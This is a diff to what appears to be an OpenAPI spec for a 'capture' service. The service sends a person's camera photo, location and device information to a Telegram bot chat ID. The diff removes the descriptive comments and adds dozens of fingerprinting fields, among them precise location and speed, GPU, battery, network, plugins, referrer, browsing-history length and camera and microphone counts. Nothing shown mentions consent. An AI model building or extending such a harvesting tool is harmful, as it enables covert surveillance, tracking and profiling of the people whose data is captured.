@@ -18,7 +18,6 @@ paths:
       operationId: healthCheck
       tags: [health]
       summary: Health check
-      description: Returns server health status
       responses:
         "200":
           description: Healthy
@@ -31,7 +30,6 @@ paths:
       operationId: submitCapture
       tags: [capture]
       summary: Submit captured user data to Telegram bot
-      description: Receives camera photo, location, and device info and sends it to the Telegram bot for the given chat_id
       requestBody:
         required: true
         content:
@@ -73,10 +71,8 @@ components:
       properties:
         chatId:
           type: string
-          description: Telegram chat ID to send data to
         photo:
           type: ["string", "null"]
-          description: Base64 encoded photo from camera (data URL)
         location:
           $ref: "#/components/schemas/LocationData"
         deviceInfo:
@@ -85,10 +81,18 @@ components:
       type: object
       properties:
         latitude:
-          type: number
+          type: ["number", "null"]
         longitude:
-          type: number
+          type: ["number", "null"]
         accuracy:
+          type: ["number", "null"]
+        altitude:
+          type: ["number", "null"]
+        altitudeAccuracy:
+          type: ["number", "null"]
+        heading:
+          type: ["number", "null"]
+        speed:
           type: ["number", "null"]
         city:
           type: ["string", "null"]
@@ -99,19 +103,106 @@ components:
           type: string
         platform:
           type: string
+        vendor:
+          type: string
+        language:
+          type: string
+        languages:
+          type: array
+          items:
+            type: string
+        timezone:
+          type: string
+        timezoneOffset:
+          type: ["number", "null"]
+        cookieEnabled:
+          type: boolean
+        doNotTrack:
+          type: ["string", "null"]
+        onLine:
+          type: boolean
+        hardwareConcurrency:
+          type: ["number", "null"]
+        deviceMemory:
+          type: ["number", "null"]
+        maxTouchPoints:
+          type: ["number", "null"]
         screenWidth:
           type: number
         screenHeight:
           type: number
-        language:
-          type: string
-        timezone:
-          type: string
+        screenAvailWidth:
+          type: ["number", "null"]
+        screenAvailHeight:
+          type: ["number", "null"]
+        colorDepth:
+          type: ["number", "null"]
+        pixelDepth:
+          type: ["number", "null"]
+        devicePixelRatio:
+          type: ["number", "null"]
+        innerWidth:
+          type: ["number", "null"]
+        innerHeight:
+          type: ["number", "null"]
+        orientationType:
+          type: ["string", "null"]
+        orientationAngle:
+          type: ["number", "null"]
         battery:
           type: ["number", "null"]
-          description: Battery level 0-100
+        charging:
+          type: ["boolean", "null"]
+        chargingTime:
+          type: ["number", "null"]
+        dischargingTime:
+          type: ["number", "null"]
         connectionType:
           type: ["string", "null"]
+        connectionDownlink:
+          type: ["number", "null"]
+        connectionRtt:
+          type: ["number", "null"]
+        connectionSaveData:
+          type: ["boolean", "null"]
+        gpuRenderer:
+          type: ["string", "null"]
+        gpuVendor:
+          type: ["string", "null"]
+        webglSupported:
+          type: ["boolean", "null"]
+        webAssemblySupported:
+          type: ["boolean", "null"]
+        serviceWorkerSupported:
+          type: ["boolean", "null"]
+        notificationPermission:
+          type: ["string", "null"]
+        cameraCount:
+          type: ["number", "null"]
+        microphoneCount:
+          type: ["number", "null"]
+        pluginsCount:
+          type: ["number", "null"]
+        pluginsList:
+          type: array
+          items:
+            type: string
+        referrer:
+          type: ["string", "null"]
+        historyLength:
+          type: ["number", "null"]
+        pdfViewerEnabled:
+          type: ["boolean", "null"]
+        cookiesBlocked:
+          type: ["boolean", "null"]
+        localStorageEnabled:
+          type: ["boolean", "null"]
+        sessionStorageEnabled:
+          type: ["boolean", "null"]
+        indexedDbEnabled:
+          type: ["boolean", "null"]
+        adBlockEnabled:
+          type: ["boolean", "null"]
     CaptureResult:
       type: object
       required:
